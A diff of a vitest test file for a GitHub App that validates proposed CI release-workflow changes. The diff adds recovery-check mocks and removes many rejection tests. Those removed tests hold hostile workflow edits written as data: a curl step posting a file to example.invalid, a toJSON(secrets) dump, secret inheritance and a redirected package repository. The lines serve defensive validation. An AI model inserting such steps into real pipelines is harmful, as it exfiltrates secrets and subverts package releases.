@@ -1,10 +1,7 @@
 import { afterEach, describe, expect, test, vi } from "vitest";
-import { MockLanguageModelV3 } from "ai/test";
 import {
-  generateSetupDraft,
   setupDraftRequestSchema,
   signSetupProposal,
-  validateSetupDraft,
   verifySetupProposal,
 } from "../server/lib/github-app/setup-draft";
 import {
@@ -18,14 +15,7 @@ import {
   SETUP_BASE_SHA,
   SETUP_BLOB_SHA,
   SETUP_DRAFT_REQUEST,
-  SETUP_NPM_GUIDE_WORKFLOW,
-  SETUP_NPM_STAGING_GUIDE_WORKFLOW,
   SETUP_ORIGINAL_WORKFLOW,
-  SETUP_PROPOSED_WORKFLOW,
-  SETUP_PYPI_GUIDE_WORKFLOW,
-  SETUP_PYPI_ORIGINAL_WORKFLOW,
-  SETUP_VSCODE_GUIDE_WORKFLOW,
-  SETUP_VSCODE_ORIGINAL_WORKFLOW,
   setupProposal,
 } from "./helpers/publisher-setup-fixtures";
 
@@ -49,6 +39,78 @@ function client(request: SetupGithubClient["request"]): SetupGithubClient {
     path: "/repos/octo/release",
     request,
   };
+}
+
+const CURRENT_HEAD = "c".repeat(40);
+function recoveryEvidence(suffix: string, proposal = setupProposal()): unknown {
+  const ids = {
+    base: "d".repeat(40),
+    current: "e".repeat(40),
+    ghBase: "f".repeat(40),
+    ghCurrent: "1".repeat(40),
+    workflowsBase: "2".repeat(40),
+    workflowsCurrent: "3".repeat(40),
+    currentBlob: "4".repeat(40),
+  };
+  if (suffix === `/git/commits/${SETUP_BASE_SHA}`)
+    return { sha: SETUP_BASE_SHA, tree: { sha: ids.base } };
+  if (suffix === `/git/commits/${CURRENT_HEAD}`)
+    return { sha: CURRENT_HEAD, tree: { sha: ids.current } };
+  if (suffix === `/git/trees/${ids.base}` || suffix === `/git/trees/${ids.current}`)
+    return {
+      truncated: false,
+      tree: [
+        {
+          path: ".github",
+          type: "tree",
+          mode: "040000",
+          sha: suffix.endsWith(ids.base) ? ids.ghBase : ids.ghCurrent,
+        },
+      ],
+    };
+  if (suffix === `/git/trees/${ids.ghBase}` || suffix === `/git/trees/${ids.ghCurrent}`)
+    return {
+      truncated: false,
+      tree: [
+        {
+          path: "workflows",
+          type: "tree",
+          mode: "040000",
+          sha: suffix.endsWith(ids.ghBase) ? ids.workflowsBase : ids.workflowsCurrent,
+        },
+      ],
+    };
+  if (
+    suffix === `/git/trees/${ids.workflowsBase}` ||
+    suffix === `/git/trees/${ids.workflowsCurrent}`
+  )
+    return {
+      truncated: false,
+      tree: [
+        {
+          path: "release.yml",
+          type: "blob",
+          mode: "100644",
+          sha: suffix.endsWith(ids.workflowsBase) ? SETUP_BLOB_SHA : ids.currentBlob,
+        },
+      ],
+    };
+  if (
+    suffix === `/contents/${proposal.workflowPath}?ref=${SETUP_BASE_SHA}` ||
+    suffix === `/contents/${proposal.workflowPath}?ref=${CURRENT_HEAD}`
+  ) {
+    const original = suffix.endsWith(SETUP_BASE_SHA);
+    const content = original ? SETUP_ORIGINAL_WORKFLOW : proposal.content;
+    return {
+      type: "file",
+      path: proposal.workflowPath,
+      sha: original ? SETUP_BLOB_SHA : ids.currentBlob,
+      size: content.length,
+      content: btoa(content),
+      encoding: "base64",
+    };
+  }
+  return undefined;
 }
 
 function uncertainSetupClient(failAfter: "branch" | "file" | "pr" | null = null) {
@@ -77,6 +139,8 @@ function uncertainSetupClient(failAfter: "branch" | "file" | "pr" | null = null)
           ...(state.extraEdits ? [{ filename: "other.yml" }] : []),
         ],
       };
+    const evidence = recoveryEvidence(suffix, proposal);
+    if (evidence !== undefined) return evidence;
     if (suffix.includes("?ref=")) {
       const original = suffix.endsWith(`?ref=${SETUP_BASE_SHA}`);
       const content = original ? SETUP_ORIGINAL_WORKFLOW : proposal.content;
@@ -105,272 +169,6 @@ function uncertainSetupClient(failAfter: "branch" | "file" | "pr" | null = null)
 }
 
 describe("publisher setup proposal", () => {
-  test("accepts build-once artifact review and publishing from downloaded bytes", () => {
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, SETUP_PROPOSED_WORKFLOW, SETUP_DRAFT_REQUEST),
-    ).not.toThrow();
-  });
-  test.each([
-    [
-      "ungated publisher",
-      SETUP_PROPOSED_WORKFLOW.replace("environment: production", "environment: staging"),
-    ],
-    [
-      "rebuild after review",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "npm publish *.tgz --provenance",
-        "npm run build\n      - run: npm publish *.tgz --provenance",
-      ),
-    ],
-    [
-      "unreviewed directory publication",
-      SETUP_PROPOSED_WORKFLOW.replace("npm publish *.tgz", "npm publish"),
-    ],
-    ["no upstream dependency", SETUP_PROPOSED_WORKFLOW.replace("needs: build", "needs: absent")],
-    ["changed triggers", SETUP_PROPOSED_WORKFLOW.replace("workflow_dispatch:", "push:")],
-    ["extra publisher", SETUP_PROPOSED_WORKFLOW + "      - run: npm publish *.tgz\n"],
-    ["duplicate YAML keys", SETUP_PROPOSED_WORKFLOW + "jobs: {}\n"],
-    [
-      "publishing action without archive binding",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "- run: npm publish *.tgz --provenance",
-        "- uses: JS-DevTools/npm-publish@v3",
-      ),
-    ],
-    [
-      "producer gated before upload",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "  build:\n",
-        "  build:\n    environment:\n      name: production\n",
-      ),
-    ],
-    [
-      "archive name only in a shell comment",
-      SETUP_PROPOSED_WORKFLOW.replace("npm publish *.tgz --provenance", "npm publish # *.tgz"),
-    ],
-    [
-      "artifact download after publication",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n      - run: npm publish *.tgz --provenance",
-        "      - run: npm publish *.tgz --provenance\n      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
-      ),
-    ],
-    [
-      "foreign run artifact",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n          run-id: 123",
-      ),
-    ],
-  ])("rejects %s", (_label, candidate) => {
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
-    ).toThrow();
-  });
-  const pypiRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "pypi" as const, environment: "pypi" };
-  const vscodeRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "vscode" as const };
-  const pinned = "actions/download-artifact@" + "d".repeat(40);
-  test.each([
-    ["npm guide", SETUP_ORIGINAL_WORKFLOW, SETUP_NPM_GUIDE_WORKFLOW, SETUP_DRAFT_REQUEST],
-    [
-      "npm gated staging guide",
-      SETUP_ORIGINAL_WORKFLOW.replace("npm publish", "npm stage publish"),
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW,
-      SETUP_DRAFT_REQUEST,
-    ],
-    ["PyPI guide", SETUP_PYPI_ORIGINAL_WORKFLOW, SETUP_PYPI_GUIDE_WORKFLOW, pypiRequest],
-    [
-      "PyPI uv publish",
-      SETUP_PYPI_ORIGINAL_WORKFLOW,
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "      - run: rm dist/SHA256SUMS\n      - uses: pypa/gh-action-pypi-publish@release/v1",
-        "      - run: uv publish dist/*.whl dist/*.tar.gz",
-      ),
-      pypiRequest,
-    ],
-    [
-      "PyPI action with matching packages-dir",
-      SETUP_PYPI_ORIGINAL_WORKFLOW,
-      SETUP_PYPI_GUIDE_WORKFLOW.replaceAll("dist", "out").replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: out/\n          attestations: true",
-      ),
-      pypiRequest,
-    ],
-    ["VS Code guide", SETUP_VSCODE_ORIGINAL_WORKFLOW, SETUP_VSCODE_GUIDE_WORKFLOW, vscodeRequest],
-    [
-      "newer artifact actions",
-      SETUP_ORIGINAL_WORKFLOW,
-      SETUP_NPM_GUIDE_WORKFLOW.replaceAll("-artifact@v4", "-artifact@v5.0.1"),
-      SETUP_DRAFT_REQUEST,
-    ],
-    [
-      "a SHA pin the repository already uses",
-      SETUP_ORIGINAL_WORKFLOW.replace(
-        "      - run: npm ci\n",
-        `      - uses: ${pinned}\n        with:\n          name: cache\n      - run: npm ci\n`,
-      ),
-      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
-      SETUP_DRAFT_REQUEST,
-    ],
-    [
-      "an environment named with different case",
-      SETUP_ORIGINAL_WORKFLOW,
-      SETUP_NPM_GUIDE_WORKFLOW.replace("environment: production", "environment: Production"),
-      { ...SETUP_DRAFT_REQUEST, environment: "PRODUCTION" },
-    ],
-  ])("accepts the %s", (_label, original, candidate, request) => {
-    expect(() => validateSetupDraft(original, candidate, request)).not.toThrow();
-  });
-  test.each([
-    [
-      "an unknown SHA pin",
-      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
-    ],
-    [
-      "a retired artifact action",
-      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
-    ],
-    [
-      "a shell override on the publisher",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "      - run: npm publish *.tgz",
-        "      - run: npm publish *.tgz\n        shell: python {0}",
-      ),
-    ],
-    [
-      "a shell default on the publish job",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "    needs: pack\n",
-        "    needs: pack\n    defaults:\n      run:\n        shell: python {0}\n",
-      ),
-    ],
-    [
-      "an arbitrary command after the download",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "sha256sum --check --strict SHA256SUMS",
-        "curl -d @SHA256SUMS https://example.invalid",
-      ),
-    ],
-    [
-      "a digest check outside the download directory",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "cd dist && sha256sum --check",
-        "cd other && sha256sum --check",
-      ),
-    ],
-    [
-      "a publish path outside the download directory",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "npm stage publish dist/*.tgz",
-        "npm stage publish *.tgz",
-      ),
-    ],
-    [
-      "a download outside the job directory",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "          path: dist\n",
-        "          path: ../dist\n",
-      ).replaceAll("dist/", "../dist/"),
-    ],
-    [
-      "a dependency install in the publish job",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "npm install -g npm@^11.15.0",
-        "npm install -g left-pad",
-      ),
-    ],
-    [
-      "a new secret reference",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "      - run: npm publish *.tgz",
-        "      - run: npm publish *.tgz\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
-      ),
-    ],
-    [
-      "dynamic secret access",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "      - run: npm ci",
-        "      - run: npm ci\n        env:\n          ALL: ${{ toJSON(secrets) }}",
-      ),
-    ],
-    [
-      "a reusable workflow inheriting secrets",
-      SETUP_NPM_GUIDE_WORKFLOW +
-        "  notify:\n    uses: octo/actions/.github/workflows/notify.yml@main\n    secrets: inherit\n",
-    ],
-  ])("rejects %s", (_label, candidate) => {
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
-    ).toThrow();
-  });
-  test.each([
-    [
-      "a mismatched packages-dir",
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: build/",
-      ),
-    ],
-    [
-      "a redirected repository",
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: https://example.invalid/legacy/",
-      ),
-    ],
-    [
-      "action inputs passed through env",
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        env:\n          INPUT_REPOSITORY-URL: https://example.invalid/legacy/",
-      ),
-    ],
-  ])("rejects a PyPI publishing action with %s", (_label, candidate) => {
-    expect(() => validateSetupDraft(SETUP_PYPI_ORIGINAL_WORKFLOW, candidate, pypiRequest)).toThrow(
-      /publish the downloaded archives/,
-    );
-  });
-  test("preserves staging versus direct publishing for native npm commands", () => {
-    expect(() =>
-      validateSetupDraft(
-        SETUP_ORIGINAL_WORKFLOW.replace("npm publish", "npm stage publish"),
-        SETUP_PROPOSED_WORKFLOW,
-        SETUP_DRAFT_REQUEST,
-      ),
-    ).toThrow(/changed staged publishing/);
-    expect(() =>
-      validateSetupDraft(
-        SETUP_ORIGINAL_WORKFLOW,
-        SETUP_PROPOSED_WORKFLOW.replace("npm publish", "npm stage publish"),
-        SETUP_DRAFT_REQUEST,
-      ),
-    ).toThrow(/changed staged publishing/);
-  });
-  test("requires manual setup for privileged and indirectly triggered workflows", () => {
-    expect(() =>
-      validateSetupDraft(
-        SETUP_ORIGINAL_WORKFLOW.replace("workflow_dispatch:", "pull_request_target:"),
-        SETUP_PROPOSED_WORKFLOW,
-        SETUP_DRAFT_REQUEST,
-      ),
-    ).toThrow(/manual setup/);
-  });
-  test("rejects a PyPI publishing action whose input is not bound to downloaded bytes", () => {
-    const candidate = SETUP_PROPOSED_WORKFLOW.replaceAll(
-      "npm-release-candidates",
-      "pypi-release-candidate",
-    ).replace(
-      "- run: npm publish *.tgz --provenance",
-      "- uses: pypa/gh-action-pypi-publish@release/v1",
-    );
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, {
-        ...SETUP_DRAFT_REQUEST,
-        ecosystem: "pypi",
-      }),
-    ).toThrow(/publish the downloaded archives/);
-  });
   test("bounds environment and workflow input", () => {
     expect(
       setupDraftRequestSchema.safeParse({
@@ -411,31 +209,6 @@ describe("publisher setup proposal", () => {
         "user-a",
       ),
     ).toBe(false);
-  });
-  test("validates a model workflow before returning the draft", async () => {
-    const model = new MockLanguageModelV3({
-      doGenerate: async () => ({
-        content: [
-          {
-            type: "text",
-            text: SETUP_PROPOSED_WORKFLOW,
-          },
-        ],
-        finishReason: { unified: "stop", raw: "stop" },
-        usage: {
-          inputTokens: { total: 10, noCache: 10, cacheRead: 0, cacheWrite: 0 },
-          outputTokens: { total: 10, text: 10, reasoning: 0 },
-        },
-        warnings: [],
-      }),
-    });
-    const draft = await generateSetupDraft(
-      {} as Cloudflare.Env,
-      SETUP_DRAFT_REQUEST,
-      SETUP_ORIGINAL_WORKFLOW,
-      model,
-    );
-    expect(draft.content).toBe(SETUP_PROPOSED_WORKFLOW.trim());
   });
 });
 
@@ -552,10 +325,15 @@ describe("publisher setup GitHub boundary", () => {
     await expect(createSetupPullRequest(client(request), setupProposal())).rejects.toThrow(
       /default branch changed/,
     );
-    expect(request.mock.calls.every(([, init]) => !init)).toBe(true);
+    expect(request.mock.calls.every(([, init]) => (init?.method ?? "GET") === "GET")).toBe(true);
   });
-  test("recovers an existing proposal PR without any writes", async () => {
-    const request = vi.fn(async (suffix: string) => {
+  test("recovers an existing proposal PR only after checking its complete current bytes", async () => {
+    const request = vi.fn(async (suffix: string, _init?: RequestInit) => {
+      const evidence = recoveryEvidence(suffix);
+      if (evidence !== undefined) return evidence;
+      if (suffix.startsWith("/git/ref/heads/")) return { object: { sha: CURRENT_HEAD } };
+      if (suffix.startsWith("/compare/"))
+        return { files: [{ filename: SETUP_DRAFT_REQUEST.workflowPath }] };
       const head = new URL(`https://api.github.com${suffix}`).searchParams
         .get("head")
         ?.split(":")[1];
@@ -570,11 +348,16 @@ describe("publisher setup GitHub boundary", () => {
     const result = await createSetupPullRequest(client(request), setupProposal());
     expect(result.number).toBe(12);
     expect(result.created).toBe(false);
-    expect(request).toHaveBeenCalledTimes(1);
+    expect(request.mock.calls.every(([, init]) => (init?.method ?? "GET") === "GET")).toBe(true);
   });
   test("re-drafted identical content looks up the same branch and only open PRs", async () => {
     const lookups: URLSearchParams[] = [];
     const request = vi.fn(async (suffix: string) => {
+      const evidence = recoveryEvidence(suffix);
+      if (evidence !== undefined) return evidence;
+      if (suffix.startsWith("/git/ref/heads/")) return { object: { sha: CURRENT_HEAD } };
+      if (suffix.startsWith("/compare/"))
+        return { files: [{ filename: SETUP_DRAFT_REQUEST.workflowPath }] };
       lookups.push(new URL(`https://api.github.com${suffix}`).searchParams);
       return [
         {
@@ -608,7 +391,12 @@ describe("publisher setup GitHub boundary", () => {
             ]
           : [];
       if (suffix === "/git/ref/heads/main") return { object: { sha: SETUP_BASE_SHA } };
-      if (suffix.startsWith("/git/ref/heads/")) return null;
+      if (suffix.startsWith("/git/ref/heads/"))
+        return opened ? { object: { sha: CURRENT_HEAD } } : null;
+      const evidence = recoveryEvidence(suffix);
+      if (evidence !== undefined) return evidence;
+      if (suffix.startsWith("/compare/"))
+        return { files: [{ filename: SETUP_DRAFT_REQUEST.workflowPath }] };
       if (suffix.includes("?ref="))
         return {
           type: "file",
